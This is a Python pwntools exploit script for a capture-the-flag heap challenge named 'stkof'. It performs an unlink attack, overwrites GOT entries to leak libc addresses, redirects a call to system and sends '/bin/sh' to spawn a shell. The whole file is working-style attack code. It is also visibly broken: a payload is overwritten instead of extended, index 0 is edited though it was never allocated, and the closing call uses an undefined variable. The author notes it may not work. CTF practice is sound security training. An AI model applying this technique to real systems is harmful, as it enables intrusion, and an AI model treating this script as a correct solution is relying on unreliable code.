'''
@Author       : 白银
@Date         : 2023-03-10 15:02:52
@LastEditors  : 白银
@LastEditTime : 2023-03-10 15:32:27
@FilePath     : /pwn/stkof.py
@Description  : offbyone  https://www.bilibili.com/video/BV1Uv411j7fr?t=2157.2&p=20
@Attention    : 可能libc版本太高了，打不通
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './stkof'
elf = ELF(pwnfile)

state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("node4.buuoj.cn", 27420)
    # libc = ELF('/home/jack/Desktop/libc.so.6')

    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/x64_libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/x86_libc.so.6')
else:
    io = process(pwnfile)

    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()


def edit(index, size, Content):
    io.sendline('2')
    io.sendline(str(index))
    io.sendline(str(size))
    io.send(Content)
    io.recvuntil('OK\n')


def free(Index):
    io.sendline('3')
    io.sendline(str(Index))


def malloc(size):
    io.sendline('1')
    io.sendline(str(size))
    io.recvuntil('OK\n')


ptr = 0x602150
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_got = elf.got["puts"]
puts_plt = elf.symbols['puts']
malloc(0x80)  # 1
malloc(0x30)  # 2

malloc(0x80)  # 3
malloc(0x80)  # 4
FD = ptr - 0x18
BK = ptr - 0x10

payload = flat([0, 0x31])
payload += flat([FD, BK])
payload += flat(['a'*16])
payload = flat([0x30, 0x90])
edit(2, 0x40, payload)
free(3)

payload1 = flat([0, atoi_got, puts_got, free_got])
edit(2, len(payload1), payload1)

payload2 = flat([puts_plt])
edit(2, len(payload2), payload2)
free(1)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print("puts_addr--->", hex(puts_addr))
onegadget = puts_addr - libc.symbols["puts"] + 0xf02a4
print("onegadget--->", hex(onegadget))
system = puts_addr - libc.symbols["puts"] + libc.symbols['system']

edit(0, 0x8, p64(system))
io.sendline('/bin/sh\x00')
p.interactive()
